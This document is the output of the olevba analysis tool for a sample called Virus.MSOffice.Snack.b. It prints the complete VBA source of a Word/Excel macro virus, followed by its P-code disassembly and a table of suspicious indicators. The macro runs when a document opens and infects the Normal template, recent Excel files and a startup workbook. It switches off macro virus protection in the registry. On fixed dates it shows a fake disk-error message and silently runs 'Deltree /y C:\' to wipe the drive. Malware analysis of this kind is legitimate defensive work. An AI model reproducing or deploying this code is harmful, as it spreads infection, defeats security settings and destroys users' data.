olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Snack.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Snack.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Snack <->>- Poison <->>- Cobra
'Macros By Liton

Private Sub Document_Open()
On Error Resume Next
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set Xla = CreateObject("Excel.Application")
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
IString = NT.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
IString = AD.Lines(1, 1)
If IString <> DString Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
With Options
.VirusProtection = False: .SaveNormalPrompt = False
End With
If System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") <> "0" Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End If
If Xla.Name = "Microsoft Excel" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
End If
For i = 1 To 4
GetName = "File" + Trim(Str(i))
FilName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", GetName)
If FilName <> "" Then
Set GO = GetObject(FilName)
If GO.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
GO.VBProject.VBComponents(1).CodeModule.DeleteLines 1, GO.VBProject.VBComponents(1).CodeModule.CountOfLines
End If
GO.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
GO.Save
End If
Next
StartPath = Xla.Application.StartupPath
If UCase(Dir(StartPath + "\Book1.")) <> "BOOK1" Then
Set WrkBook = Xla.Workbooks.Add
WrkBook.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.SaveAs StartPath & "\Book1."
WrkBook.Save
WrkBook.Close
Else
Set WrkBook = GetObject(StartPath + "\Book1.")
If WrkBook.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
WrkBook.VBProject.VBComponents(1).CodeModule.DeleteLines 1, WrkBook.VBProject.VBComponents(1).CodeModule.CountOfLines
End If
WrkBook.VBProject.VBComponents(1).CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.Save
Xla.Quit
End If
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Data error reading drive C" + Chr(13) + "Press OK to Correct this problem.", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub
Private Sub WorkBook_Deactivate()
On Error Resume Next
Set AW = ActiveWorkbook.VBProject.VBComponents(1).CodeModule
Set TW = ThisWorkbook.VBProject.VBComponents(1).CodeModule
IString = AW.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
AW.DeleteLines 1, AW.CountOfLines
AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End If
IString = TW.Lines(1, 1)
If IString <> DString Then
TW.DeleteLines 1, TW.CountOfLines
TW.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
Set WOBJ = CreateObject("Word.Application")
If WOBJ.Name = "Microsoft Word" Then
Set NT = WOBJ.NormalTemplate
MS = NT.Path
If NT.VBProject.VBComponents(1).CodeModule.CountOfLines > 0 Then
NT.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NT.VBProject.VBComponents(1).CodeModule.CountOfLines
NT.VBProject.VBComponents(1).CodeModule.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
WOBJ.Quit
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Data error reading drive C" + Chr(13) + "Press OK to Correct this problem.", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Snack.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7398 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001E "Snack <->>- Poison <->>- Cobra"
' Line #1:
' 	QuoteRem 0x0000 0x000F "Macros By Liton"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Xla 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #9:
' 	LitStr 0x001F "'Snack <->>- Poison <->>- Cobra"
' 	St DString 
' Line #10:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #15:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld Xla 
' 	MemLd New 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #29:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #32:
' 	LitStr 0x0004 "File"
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	St GetName 
' Line #33:
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List"
' 	Ld GetName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FilName 
' Line #34:
' 	Ld FilName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #35:
' 	SetStmt 
' 	Ld FilName 
' 	ArgsLd GetObject 0x0001 
' 	Set GoSub 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	Ld GoSub 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	Ld Xla 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	St StartPath 
' Line #44:
' 	Ld StartPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	IfBlock 
' Line #45:
' 	SetStmt 
' 	Ld Xla 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set WrkBook 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	Ld StartPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	Ld WrkBook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #48:
' 	Ld WrkBook 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	Ld WrkBook 
' 	ArgsMemCall Close 0x0000 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	SetStmt 
' 	Ld StartPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd GetObject 0x0001 
' 	Set WrkBook 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #56:
' 	Ld WrkBook 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	Ld Xla 
' 	ArgsMemCall Quit 0x0000 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #61:
' 	LitStr 0x001A "Data error reading drive C"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0021 "Press OK to Correct this problem."
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0005 "Cobra"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub WorkBook_Deactivate())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AW 
' Line #68:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set TW 
' Line #69:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #70:
' 	LitStr 0x001F "'Snack <->>- Poison <->>- Cobra"
' 	St DString 
' Line #71:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AW 
' 	ArgsMemCall InsertLines 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #76:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld TW 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WOBJ 
' Line #81:
' 	Ld WOBJ 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	SetStmt 
' 	Ld WOBJ 
' 	MemLd NormalTemplate 
' 	Set NT 
' Line #83:
' 	Ld NT 
' 	MemLd Path 
' 	St MS 
' Line #84:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #85:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld WOBJ 
' 	ArgsMemCall Quit 0x0000 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #91:
' 	LitStr 0x001A "Data error reading drive C"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0021 "Press OK to Correct this problem."
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0005 "Cobra"
' 	ArgsCall MsgBox 0x0003 
' Line #92:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

